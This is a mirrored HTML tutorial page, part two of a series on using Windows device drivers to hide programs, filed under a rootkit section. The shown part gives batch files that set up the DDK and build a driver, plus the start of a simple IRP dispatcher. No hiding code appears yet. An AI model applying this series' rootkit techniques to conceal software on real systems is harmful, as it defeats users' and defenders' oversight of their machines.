<html xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:w="urn:schemas-microsoft-com:office:word"
xmlns="http://www.w3.org/TR/REC-html40">


<!-- Mirrored from www.vijaymukhi.com/security/rootkit/devicedriverhidingprograms1.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:41:58 GMT -->
<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
<meta name=ProgId content=Word.Document>
<meta name=Generator content="Microsoft Word 9">
<meta name=Originator content="Microsoft Word 9">
<link rel=File-List href="devicedriverhidingprograms1_files/filelist.html">
<title>Device Driver - Hiding Programs</title>
<!--[if gte mso 9]><xml>
 <o:DocumentProperties>
  <o:Author>Vijay Mukhi</o:Author>
  <o:LastAuthor>Mr. Vijay Mukhi</o:LastAuthor>
  <o:Revision>4</o:Revision>
  <o:TotalTime>8665</o:TotalTime>
  <o:Created>2004-12-28T10:18:00Z</o:Created>
  <o:LastSaved>2004-12-14T10:44:00Z</o:LastSaved>
  <o:Pages>58</o:Pages>
  <o:Words>22130</o:Words>
  <o:Characters>126142</o:Characters>
  <o:Company>VMCI</o:Company>
  <o:Lines>1051</o:Lines>
  <o:Paragraphs>252</o:Paragraphs>
  <o:CharactersWithSpaces>154911</o:CharactersWithSpaces>
  <o:Version>9.2720</o:Version>
 </o:DocumentProperties>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <w:WordDocument>
  <w:View>Print</w:View>
  <w:HideSpellingErrors/>
  <w:HideGrammaticalErrors/>
 </w:WordDocument>
</xml><![endif]-->
<style>
<!--
 /* Font Definitions */
@font-face
	{font-family:Times;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:Helvetica;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:Courier;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:modern;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:Geneva;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:"Tms Rmn";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:Helv;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:"MS Serif";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:"MS Sans Serif";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:"New York";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:System;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:Wingdings;
	panose-1:5 0 0 0 0 0 0 0 0 0;
	mso-font-charset:2;
	mso-generic-font-family:auto;
	mso-font-pitch:variable;
	mso-font-signature:0 268435456 0 0 -2147483648 0;}
@font-face
	{font-family:Mincho;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-alt:\660E\671D;
	mso-font-charset:128;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 134676480 16 0 131072 0;}
@font-face
	{font-family:Batang;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-alt:\BC14\D0D5;
	mso-font-charset:129;
	mso-generic-font-family:auto;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 151388160 16 0 524288 0;}
@font-face
	{font-family:SimSun;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-alt:\5B8B\4F53;
	mso-font-charset:134;
	mso-generic-font-family:auto;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:1 135135232 16 0 262144 0;}
@font-face
	{font-family:PMingLiU;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-alt:\65B0\7D30\660E\9AD4;
	mso-font-charset:136;
	mso-generic-font-family:auto;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:1 134742016 16 0 1048576 0;}
@font-face
	{font-family:Gothic;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-alt:\FF7B\FF9E\FF7C\FF6F\FF78;
	mso-font-charset:128;
	mso-generic-font-family:modern;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 134676480 16 0 131072 0;}
@font-face
	{font-family:Dotum;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-alt:\B3CB\C6C0;
	mso-font-charset:129;
	mso-generic-font-family:modern;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 151388160 16 0 524288 0;}
@font-face
	{font-family:SimHei;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-alt:\9ED1\4F53;
	mso-font-charset:134;
	mso-generic-font-family:modern;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 135135232 16 0 262144 0;}
@font-face
	{font-family:MingLiU;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-alt:\7D30\660E\9AD4;
	mso-font-charset:136;
	mso-generic-font-family:modern;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 134742016 16 0 1048576 0;}
@font-face
	{font-family:"MS Mincho";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-alt:"\FF2D\FF33 \660E\671D";
	mso-font-charset:128;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 134676480 16 0 131072 0;}
@font-face
	{font-family:Gulim;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-alt:\AD74\B9BC;
	mso-font-charset:129;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 151388160 16 0 524288 0;}
@font-face
	{font-family:"MS Gothic";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-alt:"\FF2D\FF33 \30B4\30B7\30C3\30AF";
	mso-font-charset:128;
	mso-generic-font-family:modern;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 134676480 16 0 131072 0;}
@font-face
	{font-family:Century;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:Tahoma;
	panose-1:2 11 6 4 3 5 4 4 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:553679495 -2147483648 8 0 66047 0;}
@font-face
	{font-family:"Bookman Old Style";
	panose-1:2 5 6 4 5 5 5 2 2 4;
	mso-font-charset:0;
	mso-generic-font-family:roman;
	mso-font-pitch:variable;
	mso-font-signature:647 0 0 0 159 0;}
@font-face
	{font-family:"Letter Gothic";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:modern;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:Verdana;
	panose-1:2 11 6 4 3 5 4 4 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:536871559 0 0 0 415 0;}
@font-face
	{font-family:"Times New Roman \(Hebrew\)";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:177;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:6145 0 0 0 32 0;}
@font-face
	{font-family:"Times New Roman \(Arabic\)";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:178;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:8193 0 0 0 64 0;}
@font-face
	{font-family:"Arial \(Hebrew\)";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:177;
	mso-generic-font-family:swiss;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:6145 0 0 0 32 0;}
@font-face
	{font-family:"Arial \(Arabic\)";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:178;
	mso-generic-font-family:swiss;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:8193 0 0 0 64 0;}
@font-face
	{font-family:"CG Times";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:Univers;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:"Univers Condensed";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:"Antique Olive";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:"Albertus Medium";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:"Albertus Extra Bold";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:Coronet;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:script;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:Marlett;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:2;
	mso-generic-font-family:auto;
	mso-font-pitch:variable;
	mso-font-signature:0 268435456 0 0 -2147483648 0;}
@font-face
	{font-family:"Lucida Console";
	panose-1:2 11 6 9 4 5 4 2 2 4;
	mso-font-charset:0;
	mso-generic-font-family:modern;
	mso-font-pitch:fixed;
	mso-font-signature:-2147482993 6144 0 0 31 0;}
@font-face
	{font-family:"Lucida Sans Unicode";
	panose-1:2 11 6 2 3 5 4 2 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:-2147476737 14699 0 0 63 0;}
@font-face
	{font-family:"Arial Black";
	panose-1:2 11 10 4 2 1 2 2 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:647 0 0 0 159 0;}
@font-face
	{font-family:"Comic Sans MS";
	panose-1:3 15 7 2 3 3 2 2 2 4;
	mso-font-charset:0;
	mso-generic-font-family:script;
	mso-font-pitch:variable;
	mso-font-signature:647 0 0 0 159 0;}
@font-face
	{font-family:Impact;
	panose-1:2 11 8 6 3 9 2 5 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:647 0 0 0 159 0;}
@font-face
	{font-family:Georgia;
	panose-1:2 4 5 2 5 4 5 2 3 3;
	mso-font-charset:0;
	mso-generic-font-family:roman;
	mso-font-pitch:variable;
	mso-font-signature:647 0 0 0 159 0;}
@font-face
	{font-family:"Palatino Linotype";
	panose-1:2 4 5 2 5 5 5 3 3 4;
	mso-font-charset:0;
	mso-generic-font-family:roman;
	mso-font-pitch:variable;
	mso-font-signature:-536870009 1073741843 0 0 415 0;}
@font-face
	{font-family:"Trebuchet MS";
	panose-1:2 11 6 3 2 2 2 2 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:7 0 0 0 19 0;}
@font-face
	{font-family:Webdings;
	panose-1:5 3 1 2 1 5 9 6 7 3;
	mso-font-charset:2;
	mso-generic-font-family:roman;
	mso-font-pitch:variable;
	mso-font-signature:0 268435456 0 0 -2147483648 0;}
@font-face
	{font-family:"Microsoft Sans Serif";
	panose-1:2 11 6 4 2 2 2 2 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:553679495 -2147483648 8 0 66047 0;}
@font-face
	{font-family:"Arial Narrow";
	panose-1:2 11 5 6 2 2 2 3 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:647 0 0 0 159 0;}
@font-face
	{font-family:"Book Antiqua";
	panose-1:2 4 6 2 5 3 5 3 3 4;
	mso-font-charset:0;
	mso-generic-font-family:roman;
	mso-font-pitch:variable;
	mso-font-signature:647 0 0 0 159 0;}
@font-face
	{font-family:"Century Gothic";
	panose-1:2 11 5 2 2 2 2 2 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:647 0 0 0 159 0;}
@font-face
	{font-family:Garamond;
	panose-1:2 2 4 4 3 3 1 1 8 3;
	mso-font-charset:0;
	mso-generic-font-family:roman;
	mso-font-pitch:variable;
	mso-font-signature:647 0 0 0 159 0;}
@font-face
	{font-family:"Monotype Corsiva";
	panose-1:3 1 1 1 1 2 1 1 1 1;
	mso-font-charset:0;
	mso-generic-font-family:script;
	mso-font-pitch:variable;
	mso-font-signature:647 0 0 0 159 0;}
@font-face
	{font-family:"MS Outlook";
	panose-1:5 0 0 0 0 0 0 0 0 0;
	mso-font-charset:2;
	mso-generic-font-family:auto;
	mso-font-pitch:variable;
	mso-font-signature:0 268435456 0 0 -2147483648 0;}
@font-face
	{font-family:"Wingdings 2";
	panose-1:5 2 1 2 1 5 7 7 7 7;
	mso-font-charset:2;
	mso-generic-font-family:roman;
	mso-font-pitch:variable;
	mso-font-signature:0 268435456 0 0 -2147483648 0;}
@font-face
	{font-family:"Wingdings 3";
	panose-1:5 4 1 2 1 8 7 7 7 7;
	mso-font-charset:2;
	mso-generic-font-family:roman;
	mso-font-pitch:variable;
	mso-font-signature:0 268435456 0 0 -2147483648 0;}
@font-face
	{font-family:Nina;
	panose-1:2 11 6 6 3 5 4 4 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:647 0 0 0 159 0;}
 /* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-parent:"";
	margin:0in;
	margin-bottom:.0001pt;
	line-height:normal;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:windowtext;}
h1
	{mso-style-next:Normal;
	margin:0in;
	margin-bottom:.0001pt;
	line-height:normal;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:1;
	font-size:10.0pt;
	font-family:Arial;
	color:windowtext;
	mso-font-kerning:0pt;
	font-weight:normal;
	font-style:italic;}
h6
	{mso-style-next:Normal;
	margin:0in;
	margin-bottom:.0001pt;
	text-align:center;
	line-height:normal;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:6;
	font-size:12.0pt;
	mso-bidi-font-size:10.0pt;
	font-family:"Times New Roman";
	color:#000066;
	mso-text-raise:3.0pt;
	letter-spacing:1.0pt;
	font-weight:bold;}
p.MsoBodyText, li.MsoBodyText, div.MsoBodyText
	{margin:0in;
	margin-bottom:.0001pt;
	text-align:justify;
	line-height:normal;
	mso-pagination:widow-orphan;
	mso-layout-grid-align:none;
	text-autospace:none;
	font-size:10.0pt;
	font-family:"Bookman Old Style";
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:Arial;
	color:windowtext;}
a:link, span.MsoHyperlink
	{color:blue;
	text-decoration:underline;
	text-underline:single;}
a:visited, span.MsoHyperlinkFollowed
	{color:purple;
	text-decoration:underline;
	text-underline:single;}
p
	{margin-top:6.0pt;
	margin-right:0in;
	margin-bottom:12.0pt;
	margin-left:0in;
	line-height:18.0pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:black;}
pre
	{margin:0in;
	margin-bottom:.0001pt;
	line-height:normal;
	mso-pagination:widow-orphan;
	tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt;
	font-size:10.0pt;
	font-family:"Courier New";
	mso-fareast-font-family:"Courier New";
	mso-bidi-font-family:"Times New Roman";
	color:windowtext;}
span.msoIns
	{mso-style-type:export-only;
	mso-style-name:"";
	text-decoration:underline;
	text-underline:single;
	color:teal;}
span.msoDel
	{mso-style-type:export-only;
	mso-style-name:"";
	text-decoration:line-through;
	color:red;}
span.msoChangeProp
	{mso-style-type:export-only;
	mso-style-name:"";
	color:black;}
@page Section1
	{size:595.45pt 841.7pt;
	margin:.5in .5in .5in .5in;
	mso-header-margin:.5in;
	mso-footer-margin:.5in;
	mso-paper-source:0;}
div.Section1
	{page:Section1;}
-->
</style>
</head>

<body lang=EN-US link=blue vlink=purple style='tab-interval:.5in'>

<div class=Section1>

<table border=1 cellspacing=0 cellpadding=0 width="94%" bgcolor="#eeeeff"
 style='width:94.8%;background:#EEEEFF;border-collapse:collapse;border:none;
 mso-border-alt:solid windowtext .5pt;mso-padding-alt:0in 5.4pt 0in 5.4pt'>
 <tr style='height:15.1pt'>
  <td width="100%" valign=top style='width:100.0%;border:solid windowtext .5pt;
  padding:0in 5.4pt 0in 5.4pt;height:15.1pt'>
  <h6><span style='font-size:10.0pt;font-family:"Bookman Old Style"'>Device
  Driver - Hiding Programs</span><span style='font-size:11.0pt;mso-bidi-font-size:
  10.0pt'> Part2</span><sup><span style='font-size:11.0pt;mso-bidi-font-size:
  10.0pt;mso-text-raise:0pt'><o:p></o:p></span></sup></h6>
  </td>
 </tr>
</table>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>Cont……<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>Now
lets get back to the basics. The code that we have been writing so far has only
one problem. We have to reboot our machine each time. Would it not be great if
we could write a program that will load and unload our device driver each time.
This is save us time from waiting for Windows to reboot and this believe us
takes much longer than it should. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>We
have created a sub-directory driverm1 and placed all our code from now on
there. We will create three batch files and two c files as follows.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>a.bat<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>cd
\<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>cd
winddk\2600.1106\bin<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>call
setenv c:\winddk\2600.1106<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>cd
\driverm1<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>We
run this batch file only once as we need to set the environmental variables but
if we run it twice no error occurs. The header files of the ddk need certain
environmental variables to be set or else we cannot compile even the smallest
application. We mentioned it earlier that the setenv batch file sets a trillion
such variables and needs to know where we have installed the ddk on our
machine. We have installed it in the default location. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>b.bat<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>call a.bat<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>del r.obj<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>del vijay.sys<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>cl
-Ic:\winddk\2600.1106\inc\ddk\wxp -Ic:\winddk\2600.1106\inc\crt -D_X86_=1 /c
/Gz r.c<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>link
-subsystem:native,5.01 -entry:DriverEntry@8 -out:vijay.sys r.obj c:\winddk\2600.1106\lib\wxp\i386\ntoskrnl.lib<span
style="mso-spacerun: yes"> 
</span>c:\winddk\2600.1106\lib\wxp\i386\libc.lib<span style="mso-spacerun:
yes">  </span>c:\winddk\2600.1106\lib\wxp\i386\oldnames.lib
c:\winddk\2600.1106\lib\wxp\i386\hal.lib<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoBodyText style='tab-stops:.5in;mso-layout-grid-align:auto;
text-autospace:ideograph-other'><span style='mso-bidi-font-size:12.0pt;
mso-bidi-font-family:"Times New Roman"'>The file b.bat is used to build the
driver. We first call a.bat and then delete the driver obj file r.obj and the
driver Vijay.sys. We call the compiler and linker like before, the only
difference being as we move on we will use the –I option to set more include
directories. For some reason the header files are present in dozens of directories.
In the same way we will also add some more lib files for the linker to search
for code.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>The
code that we write will be in r.c. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>UNICODE_STRING
gDeviceName,gSymbolicLinkName;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>PDEVICE_OBJECT
gpDeviceObject;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>#define
DRV_NAME L&quot;vijayd&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>PIO_STACK_LOCATION
esp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>esp
= IoGetCurrentIrpStackLocation(pIrp);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>if
(esp-&gt;MajorFunction == IRP_MJ_CREATE)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>if
(esp-&gt;MajorFunction == IRP_MJ_DEVICE_CONTROL)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_DEVICE_CONTROL\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>pIrp-&gt;IoStatus.Status
= STATUS_SUCCESS;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>pIrp-&gt;IoStatus.Information
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(pIrp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

